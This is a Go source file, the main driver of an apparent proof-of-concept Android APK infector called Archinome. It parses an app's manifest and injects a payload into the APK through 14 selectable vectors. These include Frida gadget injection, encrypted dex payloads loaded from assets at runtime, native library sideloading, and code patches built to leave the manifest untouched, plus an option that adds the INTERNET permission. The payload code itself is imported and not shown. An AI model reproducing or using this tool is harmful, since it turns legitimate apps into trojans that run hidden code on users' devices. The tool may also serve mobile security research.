// author: Thatskriptkid (www.orderofsixangles.com)
// You can use my kaitai struct for binary manifest.
// https://github.com/thatskriptkid/Kaitai-Struct-Android-Manifest-binary-XML

package main

import (
	"encoding/xml"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
)

var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)\n\t8 - encrypted assets payload (dex in assets/, runtime DexClassLoader + reflection,\n\t    trigger selectable via ARCHINOME_ASSETS_VECTOR=appfactory|provider|receiver)\n\t9 - code patch of the services the host declares (manifest untouched)\n\t10 - native sideload: payload under a library name the host asks for but does\n\t    not ship (learned from the app's own loadLibrary calls)\n\t11 - code patch of the host Application class (manifest untouched)\n\t12 - <instrumentation> carrier (trigger: am instrument)\n\t13 - android:backupAgent carrier (trigger: bmgr backupnow / auto-backup)\n\t14 - android:zygotePreloadName carrier + app-zygote service (trigger: the\n\t    isolated service is started)\nenv:\n\tARCHINOME_ADD_INTERNET=1 - also add <uses-permission android:name=\"android.permission.INTERNET\"/>\n\t    to the manifest (needed by the listen-mode gadget of option 2 on hosts that\n\t    declare no INTERNET permission; skipped for option 7)"

// validOption keeps the CLI surface closed: every accepted value maps to a
// vector, and anything else prints the usage block.
func validOption(o string) bool {
	switch o {
	case "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14":
		return true
	}
	return false
}

func main() {

	//setup logging
	logFile, err := os.OpenFile("apkinfector.log", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}

	defer logFile.Close()

	log.SetOutput(logFile)

	// Запуск без аргументов — это не ошибка вызова, а просьба о справке: раньше
	// `os.Args[1]` индексировался до проверки длины и голый `archinome` падал
	// паникой вместо help_str.
	if len(os.Args) < 2 || os.Args[1] == "-h" || os.Args[1] == "--help" {
		fmt.Println(help_str)
		return
	}

	if len(os.Args) < 5 || !validOption(os.Args[4]) {
		fmt.Println(help_str)
		return
	}

	if os.Args[4] == "1" {
		utils.Payload_option = int(utils.Custom_payload)
	} else if os.Args[4] == "2" {
		utils.Payload_option = int(utils.Frida_payload)
	} else if os.Args[4] == "3" {
		utils.Payload_option = int(utils.Provider_payload)
	} else if os.Args[4] == "4" {
		utils.Payload_option = int(utils.Trampoline_payload)
	} else if os.Args[4] == "5" {
		utils.Payload_option = int(utils.Receiver_payload)
	} else if os.Args[4] == "6" {
		utils.Payload_option = int(utils.AppComponentFactory_payload)
	} else if os.Args[4] == "7" {
		utils.Payload_option = int(utils.Native_payload)
	} else if os.Args[4] == "8" {
		utils.Payload_option = int(utils.Assets_payload)
	} else if os.Args[4] == "9" {
		utils.Payload_option = int(utils.Service_payload)
	} else if os.Args[4] == "10" {
		utils.Payload_option = int(utils.Native_sideload_payload)
	} else if os.Args[4] == "11" {
		utils.Payload_option = int(utils.CodePatchApp_payload)
	} else if os.Args[4] == "12" {
		utils.Payload_option = int(utils.Instrumentation_payload)
	} else if os.Args[4] == "13" {
		utils.Payload_option = int(utils.BackupAgent_payload)
	} else if os.Args[4] == "14" {
		utils.Payload_option = int(utils.ZygotePreload_payload)
	}

	// if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
	// 	fmt.Printf("Invalid file path %s %s", os.Args[1], os.Args[2])
	// 	return
	// }

	fmt.Println("Parsing APK...")
	if utils.Payload_option == int(utils.Native_payload) ||
		utils.Payload_option == int(utils.Native_sideload_payload) {
		// The native vector edits lib/<abi>/*.so only -- it never needs the
		// manifest, and split APKs have manifests this parser cannot handle.
		fmt.Println("	--Skipped: the native vector works on lib/<abi> only")
	} else {
		manifestPlainFile, err := os.Create(manifest.PlainPath) // create/truncate the file
		if err != nil {
			log.Panic("Failed to create AndroidManifest plaintext", err)
		} else {
			enc := xml.NewEncoder(manifestPlainFile)
			enc.Indent("", "	")
			manifest.ParseApk(os.Args[1], enc)
			//close before reading
			manifestPlainFile.Close()
		}
	}

	fmt.Println("Patching APK")
	if utils.Payload_option == int(utils.Provider_payload) {
		fmt.Println("\t--Patching manifest (provider inject)...")
		manifest.PatchProvider()
	} else if utils.Payload_option == int(utils.Trampoline_payload) {
		fmt.Println("\t--Patching manifest (trampoline inject)...")
		manifest.PatchTrampoline()
	} else if utils.Payload_option == int(utils.Receiver_payload) {
		fmt.Println("	--Patching manifest (receiver inject)...")
		manifest.PatchReceiver()
	} else if utils.Payload_option == int(utils.AppComponentFactory_payload) {
		fmt.Println("	--Patching manifest (app component factory inject)...")
		manifest.PatchAppComponentFactory()
	} else if utils.Payload_option == int(utils.Assets_payload) {
		// The loader stub is identical for every trigger -- only the manifest
		// entry differs, so the assets vector reuses the existing patchers.
		trigger := strings.ToLower(os.Getenv("ARCHINOME_ASSETS_VECTOR"))
		switch trigger {
		case "provider":
			fmt.Println("	--Patching manifest (assets payload, provider trigger)...")
			manifest.PatchProvider()
		case "receiver":
			fmt.Println("	--Patching manifest (assets payload, receiver trigger)...")
			manifest.PatchReceiver()
		case "", "appfactory":
			fmt.Println("	--Patching manifest (assets payload, appComponentFactory trigger)...")
			manifest.PatchAppComponentFactory()
		default:
			log.Panicf("unknown ARCHINOME_ASSETS_VECTOR %q (appfactory|provider|receiver)", trigger)
		}
	} else if utils.Payload_option == int(utils.Native_payload) {
		// The native vector does not touch the manifest or the dex at all.
		fmt.Println("	--Native vector: manifest and dex left untouched")
	} else if utils.Payload_option == int(utils.Native_sideload_payload) {
		// Same: the payload is a library file, nothing else changes.
		fmt.Println("	--Native sideload vector: manifest and dex left untouched")
	} else if utils.Payload_option == int(utils.Service_payload) ||
		utils.Payload_option == int(utils.CodePatchApp_payload) {
		// The code-patch vectors run from a class the app already
		// instantiates, so nothing has to be declared anywhere.
		fmt.Println("	--Code-patch vector: manifest left untouched")
	} else if utils.Payload_option == int(utils.Instrumentation_payload) {
		fmt.Println("	--Patching manifest (instrumentation inject)...")
		manifest.PatchInstrumentation()
	} else if utils.Payload_option == int(utils.BackupAgent_payload) {
		fmt.Println("	--Patching manifest (backupAgent inject)...")
		manifest.PatchBackupAgent()
	} else if utils.Payload_option == int(utils.ZygotePreload_payload) {
		fmt.Println("	--Patching manifest (zygotePreload inject)...")
		manifest.PatchZygotePreload()
		manifest.PatchZygoteService()
	} else {
		fmt.Println("	--Patching manifest...")
		manifest.Patch()

		fmt.Println("	--Patching dex...")
		dex.Patch()
		// Patch() validates the dex it produced (header hashes, wrapper class,
		// superclass, string order) before handing it to the injector, and
		// panics otherwise — a broken stub would brick the app on the device.
		// The gate lives next to the emitted bytes so it cannot be bypassed.
	}

	// Opt-in: declare android.permission.INTERNET. The listen-mode frida gadget
	// (option 2) cannot create its socket without it, and a large part of the
	// real world declares no INTERNET permission at all. Off by default: the
	// patched APK then keeps exactly the permission set the host shipped with.
	// The native vector never touches the manifest, so it is skipped there.
	if os.Getenv("ARCHINOME_ADD_INTERNET") == "1" &&
		utils.Payload_option != int(utils.Native_payload) &&
		utils.Payload_option != int(utils.Native_sideload_payload) &&
		utils.Payload_option != int(utils.Service_payload) &&
		utils.Payload_option != int(utils.CodePatchApp_payload) {
		fmt.Println("	--Patching manifest (android.permission.INTERNET)...")
		manifest.PatchInternetPermission()
	}

	fmt.Println("Injecting...")
	injector.Inject(os.Args[1], os.Args[2])

	utils.Cleanup()

	fmt.Println("Done! Now you should sign your apk")
}
